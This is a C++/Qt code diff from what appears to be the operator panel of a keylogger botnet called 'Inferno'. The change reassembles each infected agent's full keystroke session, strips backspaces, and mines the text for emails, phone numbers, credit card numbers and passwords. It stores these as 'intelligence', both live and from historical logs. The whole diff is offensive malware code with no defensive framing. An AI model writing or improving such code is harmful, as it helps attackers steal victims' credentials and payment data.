@@ -532,21 +532,24 @@ void MainWindow::onKeylogReceived(const QString& ip, const QString& data) {
     QString line = QString("[%1] [%2] %3").arg(timestamp, ip, data);
     appendToKeylog(line);
 
-    // Circle 6 analysis pipeline
-    std::string text = data.toStdString();
-    auto emails = Analysis::extractEmails(text);
+    // Get the full reconstructed keylog session (chronological order)
+    QString fullKeylog = Inferno_Database::instance().getRawKeylogsChronological(uuid);
+    std::string cleanKeylog = Analysis::filterBackspaces(fullKeylog.toStdString());
+
+    // Circle 6 analysis pipeline on the filtered session keylog
+    auto emails = Analysis::extractEmails(cleanKeylog);
     for (const auto& email : emails) {
         Inferno_Database::instance().logIntelligence(uuid, "EMAIL", QString::fromStdString(email), "Keylog Stream");
     }
-    auto phones = Analysis::extractPhones(text);
+    auto phones = Analysis::extractPhones(cleanKeylog);
     for (const auto& phone : phones) {
         Inferno_Database::instance().logIntelligence(uuid, "PHONE", QString::fromStdString(phone), "Keylog Stream");
     }
-    auto cards = Analysis::extractCreditCards(text);
+    auto cards = Analysis::extractCreditCards(cleanKeylog);
     for (const auto& card : cards) {
         Inferno_Database::instance().logIntelligence(uuid, "CREDIT_CARD", QString::fromStdString(card), "Keylog Stream");
     }
-    auto passwords = Analysis::extractPasswords(text);
+    auto passwords = Analysis::extractPasswords(cleanKeylog);
     for (const auto& pair : passwords) {
         Inferno_Database::instance().logIntelligence(uuid, "PASSWORD", QString::fromStdString(pair.first), QString::fromStdString(pair.second));
     }
@@ -816,36 +819,32 @@ void MainWindow::forceScanHistory() {
 
     onStatusMessage("Scanning historical logs for agent " + ip + "...");
     
-    QStringList keylogs = Inferno_Database::instance().getKeylogHistory(uuid, 5000);
+    // Get full reconstructed keylog session (chronological order)
+    QString fullKeylog = Inferno_Database::instance().getRawKeylogsChronological(uuid);
+    std::string cleanKeylog = Analysis::filterBackspaces(fullKeylog.toStdString());
     int new_findings = 0;
     
-    for (const QString& line : keylogs) {
-        QString cleanLine = line;
-        if (line.startsWith("[") && line.indexOf("]") > 0) {
-            cleanLine = line.mid(line.indexOf("]") + 1).trimmed();
-        }
-        
-        std::string text = cleanLine.toStdString();
-        
-        auto emails = Analysis::extractEmails(text);
+    // Scan keylogs chronologically
+    {
+        auto emails = Analysis::extractEmails(cleanKeylog);
         for (const auto& email : emails) {
             if (Inferno_Database::instance().logIntelligence(uuid, "EMAIL", QString::fromStdString(email), "Historical Keylog")) {
                 new_findings++;
             }
         }
-        auto phones = Analysis::extractPhones(text);
+        auto phones = Analysis::extractPhones(cleanKeylog);
         for (const auto& phone : phones) {
             if (Inferno_Database::instance().logIntelligence(uuid, "PHONE", QString::fromStdString(phone), "Historical Keylog")) {
                 new_findings++;
             }
         }
-        auto cards = Analysis::extractCreditCards(text);
+        auto cards = Analysis::extractCreditCards(cleanKeylog);
         for (const auto& card : cards) {
             if (Inferno_Database::instance().logIntelligence(uuid, "CREDIT_CARD", QString::fromStdString(card), "Historical Keylog")) {
                 new_findings++;
             }
         }
-        auto passwords = Analysis::extractPasswords(text);
+        auto passwords = Analysis::extractPasswords(cleanKeylog);
         for (const auto& pair : passwords) {
             if (Inferno_Database::instance().logIntelligence(uuid, "PASSWORD", QString::fromStdString(pair.first), QString::fromStdString(pair.second))) {
                 new_findings++;
